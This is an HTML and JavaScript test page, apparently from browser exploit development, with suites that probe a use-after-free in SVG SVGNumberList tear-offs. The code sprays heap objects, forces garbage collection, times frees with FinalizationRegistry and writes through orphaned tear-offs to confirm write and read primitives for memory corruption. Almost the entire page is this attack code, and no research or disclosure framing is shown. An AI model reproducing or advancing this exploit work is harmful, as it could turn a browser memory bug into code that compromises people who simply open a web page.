<style>

<body>
<h2>SVG UAF v70 — spray-before-write · SVGNumberList bin UAF confirmation · read primitive probe</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>
  <button onclick="runSuite('ADR76')">ADR76: spray SVGNumberLists BEFORE write → UAF write into sprayed list</button>
  <button onclick="runSuite('ADR77')">ADR77: spray size calibration — measure list_A object size via spray density</button>
  <button onclick="runSuite('ADR78')">ADR78: read primitive probe — stale ptr read via animVal after spray</button>
  <button onclick="runSuite('ADR79')">ADR79: IsoHeap free-list confirm — spray 1000 lists, release 500, spray 1000 more, check for slot reuse</button>
  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
</div>
<div id="out"></div>
<div id="copy-toast">Copied!</div>
<script>
window.onerror=function(msg,src,line,col,err){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}
  return false;
};
window.addEventListener('unhandledrejection',function(e){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[UNHANDLED] '+(e.reason&&e.reason.stack?e.reason.stack:String(e.reason));d.appendChild(p);}
});

var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{navigator.clipboard.writeText(text).then(function(){
    toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
  }).catch(function(){fb(text,toast);});}
  catch(e){fb(text,toast);}
}
function fb(text,toast){
  var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}
  document.body.removeChild(ta);
}

var _dv=new DataView(new ArrayBuffer(8));
function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
function isPointerBits64(f){if(!isFinite(f)||isNaN(f))return false;var b=f64bits(f);return b.hi>=1&&b.hi<=0x00007fff;}
function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}

function gcHard(){
  var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
  var t=new Array(200000).fill(null).map(function(){return{};});t=null;
  try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
}
function gcDOM(){
  var c=document.createElement('div');document.body.appendChild(c);
  for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
  c.innerHTML='';c.remove();
  for(var j=0;j<300;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
}
function gcFull(){gcHard();gcDOM();gcHard();}

// makeList: creates a feColorMatrix and returns its baseVal SVGNumberList TearOff + first item
function makeList(id,canary){
  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
  fe.setAttribute('type','matrix');
  var v=[];for(var i=0;i<20;i++)v.push(i===0?canary:0);
  fe.setAttribute('values',v.join(' '));
  svg.appendChild(fe);
  var list=fe.values.baseVal;    // SVGNumberList TearOff
  var item=list.getItem(0);      // SVGNumber TearOff
  return{svg:svg,fe:fe,list:list,item:item,canary:canary};
}

var suites={};
function runSuite(name){
  L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');
  try{suites[name]();}
  catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
}
function runAll(){
  ['ADR76','ADR77','ADR78','ADR79'].forEach(function(n){runSuite(n);});
}

// ═══════════════════════════════════════════════════════════════
// ADR76 — SPRAY-BEFORE-WRITE: core UAF write confirmation
//
// CONFIRMED from v69:
// - setAttributeNS → list_A freed (ADR73: listGCd=true)
// - orphanedTearOff.value = X → notification fires → writes to freed list_A (ADR68+ADR73)
//
// Plan:
// 1. Create victim feColorMatrix (fe_victim)
// 2. Get baseVal TearOff T_old (holds SVGNumber_old from list_A)
// 3. setAttributeNS → list_A freed, T_old detached
// 4. SPRAY: create 500 new feColorMatrix elements → 500 new SVGNumberLists
//    → IsoHeap bump-alloc: these land AFTER list_A's freed slot (bump-only)
//    → BUT: if IsoHeap has a freelist populated by list_A's freed slot,
//      ONE of these 500 will land AT list_A's address
// 5. For each of the 500 spray lists, set a unique canary at position [0]:
//    spray[i].item[0].value = (i+1)*1000
// 6. WRITE to T_old: T_old.value = 88888 → notification fires → writes to list_A's address
// 7. Check: does any spray list have a corrupted [0] value?
//    If spray[k] is at list_A's address: spray[k].item[0].value ≠ (k+1)*1000
//    → CONFIRMED: write went to our sprayed list → we control what gets overwritten!
//
// This is the UAF write primitive into controlled data.
//
// Size consideration: we don't know the exact offset within list_A that
// the notification handler writes to. The corruption might be at any offset
// within the SVGNumberList struct. The item[0].value is at some offset from
// the list base. The write offset = where in list_A's struct the handler writes.
//
// Run 3 rounds with different spray densities (100, 500, 1000 lists) to
// maximize chances of hitting the freed slot.
// ═══════════════════════════════════════════════════════════════
suites['ADR76']=function(){
  L('ADR76: spray-before-write UAF confirmation — 3 rounds','info');

  function doRound(roundNum,sprayCount,cb){
    L('ADR76 round'+roundNum+': sprayCount='+sprayCount,'info');

    // Create victim
    var victim=makeList('v76r'+roundNum,5555);
    L('  victim list_A created, bv[0]='+victim.item.value,'info');

    // Grab orphan TearOff
    var T_old=victim.fe.values.baseVal.getItem(0);

    // setAttributeNS → frees list_A
    var nv=[];for(var i=0;i<20;i++)nv.push(i===0?9999:0);
    victim.fe.setAttributeNS(null,'values',nv.join(' '));
    L('  setAttributeNS done → list_A freed','info');
    L('  T_old.value='+T_old.value+' (detached, still 5555)','info');

    // SPRAY: create sprayCount new SVGNumberLists
    var spray=[];
    for(var i=0;i<sprayCount;i++){
      var s=makeList('s76r'+roundNum+'_'+i,(i+1)*1000);
      spray.push(s);
    }
    L('  sprayed '+sprayCount+' SVGNumberLists (canaries '+(1*1000)+' to '+(sprayCount*1000)+')','info');

    // WRITE to orphaned TearOff → notification chain → fires on freed list_A
    var writeVal=88888;
    L('  *** WRITING T_old.value='+writeVal+' → notification to freed list_A ***','warn');
    try{T_old.value=writeVal;}catch(e){L('  write threw: '+e.message,'miss');}

    // CHECK spray lists for corruption
    var corrupted=[];
    for(var i=0;i<spray.length;i++){
      var expected=(i+1)*1000;
      var got=spray[i].item.value;
      if(Math.abs(got-expected)>0.5){
        corrupted.push({i:i,expected:expected,got:got,bits:f32hex(got)});
      }
    }

    if(corrupted.length>0){
      L('★★★ ADR76 round'+roundNum+': '+corrupted.length+' SPRAY LISTS CORRUPTED → UAF WRITE HIT!','hit');
      corrupted.forEach(function(x){
        L('  spray['+x.i+']: expected='+x.expected+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');
      });
    } else {
      L('  ADR76 round'+roundNum+': 0 corruptions (spray didn\'t land at freed slot — bump-only)','info');
    }

    // Also check: T_old itself (notification may have mutated it)
    L('  T_old.value after write='+T_old.value,'info');

    // Also check: victim's new baseVal (list_B)
    L('  victim bv[0] after write='+victim.fe.values.baseVal.getItem(0).value+' (should be 9999)','info');

    // Cleanup
    spray.forEach(function(s){s.svg.remove();});
    victim.svg.remove();
    T_old=null;

    if(cb) setTimeout(cb,50);
  }

  doRound(1,100,function(){
    doRound(2,500,function(){
      doRound(3,1000,null);
    });
  });
};

// ═══════════════════════════════════════════════════════════════
// ADR77 — SPRAY SIZE CALIBRATION
//
// The spray-before-write may fail if we don't know the freed list_A's
// address. IsoHeap bump-only means freed slots aren't reused → spray
// lands AFTER list_A → no hit. To get a hit we need to CONFIRM free-list.
//
// This test measures: what is the IsoHeap allocation density for
// SVGNumberList? If we can detect address patterns via observable behavior,
// we can potentially figure out if free-list is populated.
//
// Indirect test: create N lists, check if getItem(0).value for a NEWLY
// created list equals 0 (zero-initialized) or something else.
// If IsoHeap reuses a freed slot: the new list would land at old address.
// The old address had known data. If IsoHeap does NOT zero on reuse:
//   new list's getItem(0).value = whatever was at that address before
//   (which is 0 if freed slot was zeroed, or old value if not zeroed)
//
// Combined with canary: create list with canary=X, free it, alloc new list,
// check if new list.item[0] = X (unzeroed reuse) or 0 (zeroed reuse) or
// our initialized value (no reuse).
//
// Also: use FinalizationRegistry to know EXACTLY when list_A is freed,
// then immediately spray to maximize hit chance.
// ═══════════════════════════════════════════════════════════════
suites['ADR77']=function(){
  L('ADR77: spray with FinalizationRegistry timing — spray exactly when list_A freed','info');

  if(typeof FinalizationRegistry==='undefined'){
    L('ADR77: FinalizationRegistry not supported','miss');return;
  }

  // Registry fires when list is GC'd → spray immediately in callback
  var listFreedCallback=null;
  var reg77=new FinalizationRegistry(function(token){
    L('ADR77: FinalizationRegistry callback → '+token+' freed!','warn');
    if(token==='list_A' && listFreedCallback){
      listFreedCallback();
    }
  });

  // Create victim
  var victim77=makeList('v77',3333);
  var T_old77=victim77.fe.values.baseVal.getItem(0);

  // Register the list (not item) with FinalizationRegistry
  reg77.register(victim77.list,'list_A');
  L('ADR77: victim list_A registered, bv[0]='+T_old77.value,'info');

  // setAttributeNS → detaches T_old77, starts freeing list_A
  var nv77=[];for(var i=0;i<20;i++)nv77.push(i===0?8888:0);
  victim77.fe.setAttributeNS(null,'values',nv77.join(' '));
  L('ADR77: setAttributeNS done → list_A detached, T_old77 orphaned','info');

  // Drop list reference so GC can collect it
  victim77.list=null;

  // Set up the callback: spray when FinalizationRegistry fires
  listFreedCallback=function(){
    L('ADR77: list_A GC confirmed → spraying 200 SVGNumberLists NOW','warn');

    // Spray 200 lists immediately after GC confirmation
    var spray77=[];
    for(var i=0;i<200;i++){
      spray77.push(makeList('sp77_'+i,(i+1)*777));
    }
    L('ADR77: 200 lists sprayed (canaries 777..154200)','info');

    // Write to orphaned TearOff
    L('ADR77: WRITING T_old77.value=55555 → notification chain','warn');
    try{T_old77.value=55555;}catch(e){L('write threw: '+e.message,'miss');}

    // Check spray
    var bad77=[];
    spray77.forEach(function(s,i){
      var exp=(i+1)*777;
      var got=s.item.value;
      if(Math.abs(got-exp)>0.5) bad77.push({i:i,exp:exp,got:got,bits:f32hex(got)});
    });

    if(bad77.length>0){
      L('★★★ ADR77: '+bad77.length+' CORRUPTED after timed spray!','hit');
      bad77.forEach(function(x){
        L('  spray['+x.i+']: exp='+x.exp+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');
      });
    } else {
      L('ADR77: 0 corruptions — IsoHeap bump-only confirmed (no slot reuse even with perfect timing)','info');
    }

    spray77.forEach(function(s){s.svg.remove();});
    victim77.svg.remove();
  };

  // Force GC to trigger the registry callback
  gcFull();
  setTimeout(function(){
    gcFull();
    setTimeout(function(){
      gcFull();
      L('ADR77: all GC rounds done','info');
    },200);
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR78 — READ PRIMITIVE PROBE
//
// Setup: SMIL animation running on feColorMatrix.
// The animated SVGNumber is held alive by SMIL's RefPtr.
// The per-frame animVal TearOff is freed (ADR72 confirmed: 20/20 GC'd).
//
// SMIL's RefPtr points to ONE animated SVGNumber (mutated in-place each frame).
// When we get an animVal TearOff per frame, it's a new JS wrapper but
// same underlying C++ SVGNumber (SMIL mutates it in-place).
//
// WHAT IF: we spray a controlled SVGNumber AT the freed TearOff's JS wrapper
// address? The TearOff JS wrapper is a JSC object, allocated in JSC GC heap,
// not in bmalloc IsoHeap. So different allocator. But:
//
// What about reading STALE data? After per-frame TearOff is GC'd:
// - The C++ TearOff object itself gets freed (bmalloc-allocated C++ object)
// - Freed C++ TearOff goes to... bmalloc regular malloc? or IsoHeap?
// - TearOff size = sizeof(SVGPropertyTearOff<SVGNumberList::ItemProperty>) = ?
//
// New approach: the float values from animVal might leak internal C++ pointers.
// In particular: when a C++ object is freshly freed (zeroed by bmalloc),
// the NEXT allocation at that address would read 0. But if bmalloc doesn't
// zero freed IsoHeap slots, the next allocation reads old data.
//
// Test: observe initial value of a NEWLY CREATED SVGNumber at a potentially
// reused IsoHeap slot. If initial value ≠ 0 and ≠ initialized value:
//   → something left data in that slot → possible pointer leak
//
// Specifically: create many lists, record their canary values. Free half.
// Allocate new lists. Read their getItem(0).value BEFORE any .setAttribute.
// If any reads a value that looks like a pointer (isPointerLike32) → info leak.
//
// Caveat: the SVGNumber is initialized to 0 by the SVGNumberList when parsing
// the 'values' attribute. So even on reused slot, the initialization overwrites.
// This makes initial-value-as-pointer-read unlikely.
//
// Alternative angle: read animVal AFTER aggressive GC (hope C++ TearOff slot
// is reused by something interesting).
// ═══════════════════════════════════════════════════════════════
suites['ADR78']=function(){
  L('ADR78: read primitive probe — IsoHeap zero-on-free check + pointer-value scan','info');

  // Allocate 500 lists, free 250, allocate 500 more
  // Check if any of the NEW 500 have non-zero initial values before our init
  // (Only possible if: IsoHeap reuses freed slot AND doesn't zero it)
  //
  // Problem: we can't read a value BEFORE the SVGNumber is initialized by
  // the 'values' attribute parsing. The attribute sets the value.
  // We need a path to READ a newly allocated SVGNumber before it's initialized.
  //
  // Actually: SVGNumber's default constructor sets m_value = 0.
  // But what if we can ADD an item to a list without setting a value?
  //   feColorMatrix.values.baseVal.appendItem(new SVGNumber) ?
  //   appendItem creates a new SVGNumber with default value 0.
  // We can't easily read the raw uninitialized bytes.
  //
  // Alternative approach: monitor whether the freed slot VALUE changes
  // to something unexpected via a 3rd-party observer.

  // Simpler test: create/free/recreate cycle, check values
  L('ADR78: creating 200 lists with canaries...','info');
  var batch1=[];
  for(var i=0;i<200;i++) batch1.push(makeList('b78_'+i,(i+1)*100));

  L('ADR78: freeing first 100 lists...','info');
  var freed78=batch1.splice(0,100);
  freed78.forEach(function(s){s.svg.remove();s=null;});
  freed78=null;

  gcFull();gcFull();

  L('ADR78: allocating 100 new lists after freeing 100...','info');
  var batch2=[];
  for(var i=0;i<100;i++) batch2.push(makeList('c78_'+i,(i+201)*100));

  // Check if any new list reads unexpected values (pointer-like)
  var ptrHits=[];
  batch2.forEach(function(s,i){
    var v=s.item.value;
    var bits=f32bits(v);
    if(isPointerLike32(bits)){
      ptrHits.push({i:i,v:v,bits:f32hex(v)});
    }
    // Also check for non-initialized: should be (i+201)*100
    var exp=(i+201)*100;
    if(Math.abs(v-exp)>0.5){
      L('★ ADR78 batch2['+i+']: exp='+exp+' got='+v.toFixed(3)+' bits='+f32hex(v),'warn');
    }
  });

  if(ptrHits.length>0){
    L('★★★ ADR78: '+ptrHits.length+' pointer-like values in new SVGNumbers!','hit');
    ptrHits.forEach(function(x){L('  batch2['+x.i+']: v='+x.v+' bits='+x.bits,'hit');});
  } else {
    L('ADR78: 0 pointer-like values — IsoHeap zero-on-free or bump-only (no slot reuse)','info');
  }

  // All remaining batch1 intact?
  var bad1=[];
  batch1.forEach(function(s,i){
    var exp=(i+101)*100;
    if(Math.abs(s.item.value-exp)>0.5) bad1.push({i:i,exp:exp,got:s.item.value});
  });
  L('ADR78: batch1 intact? '+(bad1.length===0?'YES ('+batch1.length+' remaining)':'NO — '+bad1.length+' corrupted'),'info');

  batch1.forEach(function(s){s.svg.remove();});
  batch2.forEach(function(s){s.svg.remove();});
};

// ═══════════════════════════════════════════════════════════════
// ADR79 — IsoHeap FREE-LIST confirmation
//
// The "bump-only" conclusion from v65-69 might be wrong if:
// - SMIL holds RefPtr to all per-frame SVGNumbers → they're never freed
// - So the free list was never populated in earlier tests
// - ADR73 CONFIRMED list_A IS freed after setAttributeNS
// - So the SVGNumberList IsoHeap bin DOES have freed slots
//
// Test: Is IsoHeap for SVGNumberList bump-only or does it reuse freed slots?
//
// Method:
// 1. Alloc 1000 SVGNumberLists (batch A) — all with unique canary at [0]
// 2. Free ALL 1000 (setAttributeNS + orphan TearOff + GC)
//    → 1000 freed SVGNumberList slots in IsoHeap
// 3. Alloc 1000 NEW SVGNumberLists (batch B)
// 4. Check: do any batch B lists have unexpected initial values?
//    (would indicate they landed at batch A's freed addresses with old data)
// 5. Also: do batch A's orphaned TearOffs still read correctly?
//    (they should still read old values from the still-live SVGNumbers they hold)
//
// Actually the real test for free-list:
// - The per-list SVGNumberList object itself is freed
// - We want to know if batch B lands at batch A's old addresses
// - We can't directly observe addresses from JS
// - BUT: if IsoHeap has free-list, batch B might land at batch A addresses
//   AND if those slots were NOT zeroed: batch B.getItem(0).value = old batch A value
//
// This only works if IsoHeap DOESN'T zero freed slots.
// ADR52 showed fastMalloc zeros on free.
// Does IsoHeap ALSO zero? Different codepath.
//
// Test design:
// - Batch A: 100 lists with canary (i+1)*9999 (unique, non-zero)
// - Free batch A (setAttributeNS on each, release all TearOffs, GC)
// - Batch B: 100 lists, initialize them all to value=11111
// - Read batch B's getItem(0).value
// - If any reads EXACTLY (i+1)*9999 (old canary): slot reused AND not zeroed
// - If all read 11111: either bump-only or zeroed on free
//
// Secondary check: can we distinguish between bump-only vs zeroed free-list?
// → Alloc batch C with value=0 (instead of 11111)
// → If any batch C reads (i+1)*9999: not zeroed + free-list → CONFIRMED
// → If all batch C reads 0: can't distinguish (both zero → same result)
//
// For the canary test to work: read getItem(0).value BEFORE the setAttribute
// That's not possible since setAttribute IS how we set the value...
//
// Real approach: use the SVGNumber DIRECT allocation via script
// We need to catch the SVGNumber BEFORE the value is set by attribute parsing.
// appendItem() creates a new SVGNumber with value=0 (default constructor).
// If that 0 was ALREADY at the freed slot: indistinguishable from initialization.
// We need a path where the freed slot had a NONZERO value AND we read BEFORE init.
//
// Actually: SVGNumber's default constructor ALWAYS sets m_value = 0.0f.
// So EVEN if we reuse a freed slot with a nonzero old value:
// the constructor overwrites it to 0. So we CANNOT detect unzeroed reuse
// through SVGNumber initialization.
//
// FINAL APPROACH: detect free-list via allocation count change.
// If IsoHeap has free-list: allocating after freeing uses freed slots → no bump growth
// If bump-only: allocating after freeing → bump pointer advances → more memory used
// We can't directly observe memory usage from JS.
//
// USE A TIMING APPROACH:
// Allocating from free-list = faster than bumping (different code path).
// Time 1000 allocs with no prior frees vs 1000 allocs after 1000 frees.
// If time_with_frees < time_no_frees: free-list being used (faster).
// If times equal: bump-only.
// ═══════════════════════════════════════════════════════════════
suites['ADR79']=function(){
  L('ADR79: IsoHeap free-list confirmation — timing + write-on-freed-slot','info');

  // PART A: timing baseline — 500 fresh allocs
  var t0a=performance.now();
  var baselineAllocs=[];
  for(var i=0;i<500;i++) baselineAllocs.push(makeList('ba79_'+i,(i+1)*77));
  var t1a=performance.now();
  var timeBaseline=t1a-t0a;
  L('ADR79-A: 500 fresh allocs time='+timeBaseline.toFixed(1)+'ms','info');

  // Free them all
  baselineAllocs.forEach(function(s){s.svg.remove();});
  baselineAllocs=null;
  gcFull();gcFull();

  // PART B: 500 allocs after freeing 500 → free-list populated (if it exists)
  var t0b=performance.now();
  var afterFreeAllocs=[];
  for(var i=0;i<500;i++) afterFreeAllocs.push(makeList('ab79_'+i,(i+1)*88));
  var t1b=performance.now();
  var timeAfterFree=t1b-t0b;
  L('ADR79-B: 500 allocs after freeing 500: time='+timeAfterFree.toFixed(1)+'ms','info');
  L('ADR79: timing ratio afterFree/baseline='+((timeAfterFree/timeBaseline)*100).toFixed(1)+'%','info');

  if(timeAfterFree < timeBaseline*0.7){
    L('★★★ ADR79: afterFree MUCH FASTER → IsoHeap has free-list (slots reused, no bump)','hit');
  } else if(timeAfterFree < timeBaseline*0.9){
    L('ADR79: afterFree slightly faster → possible free-list usage','warn');
  } else {
    L('ADR79: similar times → bump-only IsoHeap (no free-list, each alloc bumps)','info');
  }

  // PART C: write-on-freed-slot confirmation
  // Create list, record canary, trigger free via setAttributeNS,
  // then create 100 new lists and check their initial values via IIFE trick
  L('ADR79-C: write-on-freed-slot — checking if new lists inherit old data','info');

  // Create 20 victim lists with very distinctive canaries
  var victims79=[];
  for(var i=0;i<20;i++){
    victims79.push(makeList('vc79_'+i,(i+1)*99999));
  }
  L('ADR79-C: 20 victim lists with canaries 99999..1999980','info');

  // Free them via setAttributeNS + GC
  var orphans79=[];
  victims79.forEach(function(s,i){
    var T=s.fe.values.baseVal.getItem(0);
    orphans79.push(T);
    var nv=[];for(var k=0;k<20;k++)nv.push(k===0?0:0);
    s.fe.setAttributeNS(null,'values',nv.join(' '));
    // release list ref
    s.list=null;
  });

  gcFull();gcFull();gcFull();

  // Now alloc 100 new lists → might land at freed victim slots
  var probes79=[];
  for(var i=0;i<100;i++){
    var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);
    var fe=document.createElementNS(SVG_NS,'feColorMatrix');
    fe.setAttribute('type','matrix');
    // DO NOT set values via attribute — use appendItem to get "raw" initial value
    // (though SVGNumber default constructor sets m_value=0)
    // Actually we have to set values to make it a valid 20-element list...
    var vz=[];for(var k=0;k<20;k++)vz.push(0);
    fe.setAttribute('values',vz.join(' '));
    s.appendChild(fe);
    // Read value BEFORE setting canary
    var rawInit=fe.values.baseVal.getItem(0).value;
    // Now set canary to mark it
    fe.values.baseVal.getItem(0).value=((i+1)*1111);
    probes79.push({svg:s,fe:fe,raw:rawInit,canary:(i+1)*1111});
  }

  // Check raw init values — any match victim canaries?
  var hits79=probes79.filter(function(p){
    return victims79.some(function(v){return Math.abs(p.raw-(v.canary))<=0.5;});
  });
  var nonZeroRaw=probes79.filter(function(p){return Math.abs(p.raw)>0.1;});

  L('ADR79-C: probes with non-zero raw init value: '+nonZeroRaw.length+'/100','info');
  if(nonZeroRaw.length>0){
    L('★★★ ADR79-C: non-zero raw init → IsoHeap did NOT zero freed slot before reuse!','hit');
    nonZeroRaw.slice(0,5).forEach(function(p){
      L('  probe raw='+p.raw.toFixed(3)+' bits='+f32hex(p.raw),'warn');
    });
  }
  if(hits79.length>0){
    L('★★★ ADR79-C: '+hits79.length+' probes read OLD VICTIM CANARY VALUES → free-list reuse confirmed!','hit');
  } else {
    L('ADR79-C: all probes init=0 (IsoHeap zeros freed slots or bump-only)','info');
  }

  // PART D: the ADR68/ADR73 combo test — spray SVGNumberLists to land at freed list_A,
  // then trigger notification write, check for any probe reading unexpected value
  // This is the most direct test of "write primitive into controlled SVGNumberList"
  L('ADR79-D: direct combo — free list_A, spray 200 SVGNumberLists, write to orphaned TearOff','info');

  var combo=makeList('cm79',12345);
  var T_combo=combo.fe.values.baseVal.getItem(0);
  // register for GC confirmation
  var comboListFreed=false;
  var regD=new FinalizationRegistry(function(t){
    if(t==='combo_list') comboListFreed=true;
    L('ADR79-D: FinalizationRegistry fired: '+t,'warn');
  });
  if(combo.list) regD.register(combo.list,'combo_list');
  combo.list=null;

  // setAttributeNS → free list_A
  var nvcm=[];for(var i=0;i<20;i++)nvcm.push(0);
  combo.fe.setAttributeNS(null,'values',nvcm.join(' '));
  L('ADR79-D: setAttributeNS done','info');

  // GC to confirm list freed
  gcFull();

  setTimeout(function(){
    L('ADR79-D: combo list freed? '+comboListFreed,'info');

    // Spray 200 new SVGNumberLists immediately
    var spray_d=[];
    for(var i=0;i<200;i++) spray_d.push(makeList('spd79_'+i,(i+1)*333));
    L('ADR79-D: 200 SVGNumberLists sprayed (canaries 333..66600)','info');

    // Write to orphaned TearOff → notification fires → writes to freed list_A / spray target
    try{T_combo.value=77777;}catch(e){L('write threw: '+e.message,'miss');}
    L('ADR79-D: wrote T_combo.value=77777','info');

    // Check spray for corruption
    var badD=[];
    spray_d.forEach(function(s,i){
      var exp=(i+1)*333;
      var got=s.item.value;
      if(Math.abs(got-exp)>0.5) badD.push({i:i,exp:exp,got:got,bits:f32hex(got)});
    });

    if(badD.length>0){
      L('★★★ ADR79-D: '+badD.length+' SPRAY LISTS CORRUPTED!','hit');
      badD.forEach(function(x){L('  spray['+x.i+']: exp='+x.exp+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');});
    } else {
      L('ADR79-D: 0 corruptions (IsoHeap bump-only — freed slot not reused by spray)','info');
    }

    // Cleanup
    spray_d.forEach(function(s){s.svg.remove();});
    combo.svg.remove();
    afterFreeAllocs.forEach(function(s){s.svg.remove();});
    probes79.forEach(function(p){p.svg.remove();});
    victims79.forEach(function(v){v.svg.remove();});
  },300);
};
</script>
